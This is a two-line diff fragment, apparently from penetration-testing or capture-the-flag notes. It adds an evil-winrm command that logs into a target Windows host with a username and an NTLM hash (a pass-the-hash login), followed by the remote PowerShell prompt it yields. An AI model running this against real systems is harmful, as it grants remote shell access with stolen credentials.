@@ -1,0 +1,2 @@
+evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>
+*Evil-WinRM* PS C:\>
